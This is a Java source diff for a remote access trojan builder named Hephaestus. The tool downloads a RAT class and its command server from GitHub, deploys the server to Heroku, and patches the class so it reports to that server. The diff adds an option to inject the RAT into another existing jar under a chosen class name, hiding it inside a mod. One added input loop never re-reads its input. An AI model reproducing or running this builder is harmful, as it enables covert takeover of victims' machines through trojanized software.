@@ -5,7 +5,10 @@ import com.heroku.api.HerokuAPI;
 import jdk.internal.org.objectweb.asm.ClassReader;
 import jdk.internal.org.objectweb.asm.ClassWriter;
 import jdk.internal.org.objectweb.asm.Opcodes;
-import jdk.internal.org.objectweb.asm.tree.*;
+import jdk.internal.org.objectweb.asm.tree.AbstractInsnNode;
+import jdk.internal.org.objectweb.asm.tree.ClassNode;
+import jdk.internal.org.objectweb.asm.tree.LdcInsnNode;
+import jdk.internal.org.objectweb.asm.tree.MethodNode;
 import net.lingala.zip4j.ZipFile;
 import org.apache.commons.io.FileUtils;
 import org.apache.commons.io.IOUtils;
@@ -13,41 +16,40 @@ import org.eclipse.jgit.api.Git;
 import org.eclipse.jgit.lib.StoredConfig;
 import org.eclipse.jgit.transport.UsernamePasswordCredentialsProvider;
 
+import java.awt.*;
 import java.io.File;
 import java.io.InputStream;
 import java.net.URI;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
-import java.nio.file.Path;
 import java.nio.file.Paths;
 import java.util.Collections;
+import java.util.Enumeration;
 import java.util.Scanner;
-import java.util.jar.Attributes;
-import java.util.jar.JarOutputStream;
-import java.util.jar.Manifest;
+import java.util.jar.*;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 import java.util.zip.ZipEntry;
 
 public class Tasks {
+    //paths
     public static File path = new File(System.getenv("APPDATA") + "\\Hephaestus");
+    public static File jdkPath = new File(path + "\\jdk");
+    public static File ratClass = new File(path + "\\rat\\Rat.class");
+    public static File serverPath = new File(path + "\\server");
+    public static File serverClass = new File(serverPath + "\\app.js");
 
-    public static Path jdkPath = Paths.get(path + "\\jdk");
-
-    public static Path ratPath = Paths.get(path + "\\rat");
-    public static Path ratClass = Paths.get(ratPath + "\\Rat.class");
-
-    public static Path serverPath = Paths.get(path + "\\server");
-    public static Path serverClass = Paths.get(serverPath + "\\app.js");
-
+    //api
     public static HerokuAPI herokuAPI;
-    public static String apiKey;
-
     public static Git git;
-    public static boolean reusing;
 
-    public static Scanner sc = new Scanner(System.in);
+    //global vars
+    public static String apiKey;
+    public static boolean reusing;
     public static String appName;
+
+    //input
+    public static Scanner sc = new Scanner(System.in);
 
     public static void fullSetup() {
         //setup
@@ -92,7 +94,7 @@ public class Tasks {
                 return;
             }
             
-            if (jdkPath.toFile().exists()) {
+            if (jdkPath.exists()) {
                 log("Java JDK already downloaded.");
                 log("Skipping download.");
                 return;
@@ -170,12 +172,12 @@ public class Tasks {
         try {
             log("Downloading server from upstream...");
 
-            FileUtils.copyURLToFile(new URI("https://raw.githubusercontent.com/DxxxxY/R.A.T/master/server/models/Ratted.js").toURL(), new File(serverPath.toFile() + "\\models\\Ratted.js"));
-            FileUtils.copyURLToFile(new URI("https://raw.githubusercontent.com/DxxxxY/R.A.T/master/server/.gitignore").toURL(), new File(serverPath.toFile() + "\\.gitignore"));
-            FileUtils.copyURLToFile(new URI("https://raw.githubusercontent.com/DxxxxY/R.A.T/master/server/Procfile").toURL(), new File(serverPath.toFile() + "\\Procfile"));
-            FileUtils.copyURLToFile(new URI("https://raw.githubusercontent.com/DxxxxY/R.A.T/master/server/app.js").toURL(), new File(serverPath.toFile() + "\\app.js"));
-            FileUtils.copyURLToFile(new URI("https://raw.githubusercontent.com/DxxxxY/R.A.T/master/server/package-lock.json").toURL(), new File(serverPath.toFile() + "\\package-lock.json"));
-            FileUtils.copyURLToFile(new URI("https://raw.githubusercontent.com/DxxxxY/R.A.T/master/server/package.json").toURL(), new File(serverPath.toFile() + "\\package.json"));
+            FileUtils.copyURLToFile(new URI("https://raw.githubusercontent.com/DxxxxY/R.A.T/master/server/models/Ratted.js").toURL(), new File(serverPath + "\\models\\Ratted.js"));
+            FileUtils.copyURLToFile(new URI("https://raw.githubusercontent.com/DxxxxY/R.A.T/master/server/.gitignore").toURL(), new File(serverPath + "\\.gitignore"));
+            FileUtils.copyURLToFile(new URI("https://raw.githubusercontent.com/DxxxxY/R.A.T/master/server/Procfile").toURL(), new File(serverPath + "\\Procfile"));
+            FileUtils.copyURLToFile(new URI("https://raw.githubusercontent.com/DxxxxY/R.A.T/master/server/app.js").toURL(), new File(serverPath + "\\app.js"));
+            FileUtils.copyURLToFile(new URI("https://raw.githubusercontent.com/DxxxxY/R.A.T/master/server/package-lock.json").toURL(), new File(serverPath + "\\package-lock.json"));
+            FileUtils.copyURLToFile(new URI("https://raw.githubusercontent.com/DxxxxY/R.A.T/master/server/package.json").toURL(), new File(serverPath + "\\package.json"));
 
             ok("Downloaded server from upstream.");
         } catch (Exception e) {
@@ -189,7 +191,7 @@ public class Tasks {
         try {
             log("Downloading R.A.T class from upstream...");
 
-            FileUtils.copyURLToFile(new URI("https://raw.githubusercontent.com/DxxxxY/R.A.T/master/Rat.class").toURL(), ratClass.toFile());
+            FileUtils.copyURLToFile(new URI("https://raw.githubusercontent.com/DxxxxY/R.A.T/master/Rat.class").toURL(), ratClass);
 
             ok("Downloaded R.A.T class from upstream.");
         } catch (Exception e) {
@@ -205,8 +207,8 @@ public class Tasks {
         try {
             log("Initializing server git repository...");
 
-            Git.init().setDirectory(serverPath.toFile()).call();
-            git = Git.open(serverPath.toFile());
+            Git.init().setDirectory(serverPath).call();
+            git = Git.open(serverPath);
 
             //check for already existing git repo remote
             //noinspection RegExpRedundantEscape
@@ -317,9 +319,9 @@ public class Tasks {
             config.setString("remote", "heroku", "fetch", "+refs/heads/*:refs/remotes/heroku/*");
             config.save();
 
-            Git.open(serverPath.toFile()).add().addFilepattern(".").call();
-            Git.open(serverPath.toFile()).commit().setMessage("Hephaestus Autocommit").call();
-            Git.open(serverPath.toFile()).push().setCredentialsProvider(new UsernamePasswordCredentialsProvider("", apiKey)).setRemote("heroku").call();
+            Git.open(serverPath).add().addFilepattern(".").call();
+            Git.open(serverPath).commit().setMessage("Hephaestus Autocommit").call();
+            Git.open(serverPath).push().setCredentialsProvider(new UsernamePasswordCredentialsProvider("", apiKey)).setRemote("heroku").call();
 
             ok("Heroku app deployed.");
         } catch (Exception e) {
@@ -336,16 +338,16 @@ public class Tasks {
             log("Changing server URL...");
 
             //open class
-            InputStream is = Files.newInputStream(ratClass.toFile().toPath());
+            InputStream is = Files.newInputStream(ratClass.toPath());
             byte[] bytes = IOUtils.toByteArray(is);
             ClassNode cn = getNode(bytes);
 
             //find ldc instruction of the url and replace it with our own
-            for (MethodNode mn : cn.methods){
-                for (AbstractInsnNode ain : mn.instructions.toArray()){
-                    if (ain.getOpcode() == Opcodes.LDC){
+            for (MethodNode mn : cn.methods) {
+                for (AbstractInsnNode ain : mn.instructions.toArray()) {
+                    if (ain.getOpcode() == Opcodes.LDC) {
                         LdcInsnNode ldc = (LdcInsnNode) ain;
-                        if (ldc.cst instanceof String){
+                        if (ldc.cst instanceof String) {
                             if (ldc.cst.toString().equals("http://localhost:80/")) {
                                 ldc.cst = "https://" + appName + ".herokuapp.com/";
                             }
@@ -367,14 +369,37 @@ public class Tasks {
 
             log("Saving as jar...");
 
-            //compile class to jar
-            ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
-            cn.accept(cw);
-            saveAsJar(cw.toByteArray(), path + "\\R.A.T.jar");
+            log("Do you wish to insert this class into another jar? [y/n]");
+            String answer = sc.nextLine();
+            if (answer.equals("y")) {
+                log("Please enter the full path of the jar: ");
+
+                File jar = new File(sc.nextLine());
+                while (!jar.exists()) {
+                    error("File does not exist.");
+                }
+
+                //change package and name of class
+                log("Please enter the full name of the class: (eg: studio.dreamys.Rat)");
+                String className = sc.nextLine();
+                className = className.replace(".", "/");
+                cn.name = className;
+
+                //write changes
+                ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
+                cn.accept(cw);
+
+                saveAsJar(cw.toByteArray(), jar, className);
+            } else {
+                //compile class to jar
+                ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
+                cn.accept(cw);
+                saveAsJar(cw.toByteArray(), path + "\\R.A.T.jar");
+            }
 
             ok("Saved as jar.");
         } catch (Exception e) {
-            error("Something went wrong while modifying rat class.");
+            error("Something went wrong while building the mod.");
             e.printStackTrace();
             exit();
         }
@@ -384,12 +409,14 @@ public class Tasks {
 
     public static ClassNode getNode(byte[] bytes) {
         ClassNode cn = new ClassNode();
+
         try {
             ClassReader cr = new ClassReader(bytes);
             cr.accept(cn, ClassReader.EXPAND_FRAMES);
         } catch (Exception e) {
             e.printStackTrace();
         }
+
         return cn;
     }
 
@@ -399,23 +426,61 @@ public class Tasks {
             Manifest mf = new Manifest();
             mf.getMainAttributes().put(Attributes.Name.MANIFEST_VERSION, "1.0");
 
-            //open jar output stream
+            //open new jar output stream
             JarOutputStream out = new JarOutputStream(Files.newOutputStream(Paths.get(fileName)), mf);
 
             //write bytes to class
             out.putNextEntry(new ZipEntry("studio/dreamys/Rat.class"));
             out.write(outBytes);
             out.close();
+
+            //open built jar folder
+            Desktop.getDesktop().open(path);
         } catch (Exception e) {
             e.printStackTrace();
         }
     }
 
-    public static void replaceInFile(Path path, String find, String replace) {
+    public static void saveAsJar(byte[] outBytes, File jar, String className) {
         try {
-            String content = new String(Files.readAllBytes(path), StandardCharsets.UTF_8);
+            //buffers
+            byte[] buffer = new byte[1024];
+            int bytesRead;
+
+            //open existing jar file
+            JarFile jarFile = new JarFile(jar);
+
+            //open new jar output stream
+            JarOutputStream out = new JarOutputStream(Files.newOutputStream(Paths.get(path + "\\" + jar.getName())));
+
+            //rewrite everything from the jar file into our own
+            for (Enumeration<JarEntry> e = jarFile.entries(); e.hasMoreElements(); ) {
+                JarEntry entry = e.nextElement();
+                InputStream entryStream = jarFile.getInputStream(entry);
+                out.putNextEntry(entry);
+
+                while ((bytesRead = entryStream.read(buffer)) != -1) {
+                    out.write(buffer, 0, bytesRead);
+                }
+            }
+
+            //write our own class to the jar
+            out.putNextEntry(new JarEntry(className + ".class"));
+            out.write(outBytes);
+            out.close();
+
+            //open built jar folder
+            Desktop.getDesktop().open(path);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    public static void replaceInFile(File file, String find, String replace) {
+        try {
+            String content = new String(Files.readAllBytes(file.toPath()), StandardCharsets.UTF_8);
             content = content.replaceAll(find, replace);
-            Files.write(path, content.getBytes(StandardCharsets.UTF_8));
+            Files.write(file.toPath(), content.getBytes(StandardCharsets.UTF_8));
         } catch (Exception e) {
             e.printStackTrace();
         }
@@ -424,19 +489,19 @@ public class Tasks {
     /* Shortcut utils */
 
     public static void log(String message) {
-        System.out.println("[Hephaestus] " + message);
+        System.out.println("[Hephaestus] ― " + message);
     }
 
     public static void warn(String message) {
-        System.out.println("[Hephaestus] !!! " + message + " !!!");
+        System.out.println("[Hephaestus] ‼ " + message);
     }
 
     public static void ok(String message) {
-        System.out.println("[Hephaestus] ✔ " + message);
+        System.out.println("[Hephaestus] • " + message);
     }
 
     public static void error(String message) {
-        System.out.println("[Hephaestus] ❌ " + message);
+        System.out.println("[Hephaestus] × " + message);
     }
 
     public static void separator() {
